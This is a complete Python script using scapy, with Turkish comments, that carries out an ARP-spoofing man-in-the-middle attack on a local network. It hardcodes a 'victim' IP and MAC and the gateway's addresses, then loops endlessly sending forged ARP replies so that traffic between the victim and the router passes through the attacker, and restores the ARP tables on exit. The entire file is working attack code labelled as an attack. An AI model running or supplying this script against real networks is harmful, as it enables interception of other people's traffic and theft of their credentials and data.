import scapy.all as scapy
import time
import sys

# -------------------------------------------------------------
# Kurban Bilgileri
target_ip = "192.168.1.102"
target_mac = "3E:3D:35:46:DE:74"

# Modem Bilgileri
gateway_ip = "192.168.1.1"
gateway_mac = "B2:55:EC:99:0D:01"

# Kullanılan Arayüz
interface = "wlan0"
# -------------------------------------------------------------

def spoof(target_ip, target_mac, spoof_ip):
    """
    Hedefe sahte ARP cevabı gönderir.
    DÜZELTME: Ethernet çerçevesi eklendi ve sendp kullanıldı.
    """
    # 1. Ethernet Çerçevesi oluştur (Hedef MAC adresi buraya yazılır)
    ether_frame = scapy.Ether(dst=target_mac)
    
    # 2. ARP Paketi oluştur
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # 3. İkisini birleştir
    packet = ether_frame / arp_packet
    
    # 4. sendp (Layer 2) ile gönder
    scapy.sendp(packet, verbose=False, iface=interface)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    """
    Program kapatıldığında ARP tablolarını düzeltir.
    """
    # Düzeltme işlemi için de Ethernet çerçevesi ekliyoruz
    ether_frame = scapy.Ether(dst=dest_mac)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    
    packet = ether_frame / arp_packet
    
    # Layer 2 üzerinden gönderim
    scapy.sendp(packet, count=4, verbose=False, iface=interface)

# --- ANA PROGRAM ---
try:
    print("\n" + "="*50)
    print(f"[*] SALDIRI BAŞLATILIYOR: {interface} üzerinden")
    print(f"[*] Kurban: {target_ip} ({target_mac})")
    print(f"[*] Modem : {gateway_ip} ({gateway_mac})")
    print("="*50)
    print("[*] Çıkmak için CTRL+C tuşuna basabilirsin.\n")

    sent_packets_count = 0
    while True:
        # 1. Kurbana git: "Ben Modemim" de
        spoof(target_ip, target_mac, gateway_ip)
        
        # 2. Modeme git: "Ben Kurbanım" de
        spoof(gateway_ip, gateway_mac, target_ip)
        
        sent_packets_count += 2
        # Ekrana dinamik yazdırma
        print(f"\r[+] Gönderilen ARP Paketi Sayısı: {sent_packets_count}", end="")
        
        # Ağı kilitlememek için 2 saniye bekle
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[!] Saldırı durduruldu. (CTRL+C tespit edildi)")
    print("[*] ARP tabloları eski haline getiriliyor (Restore)...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] İşlem tamam. Güle güle!")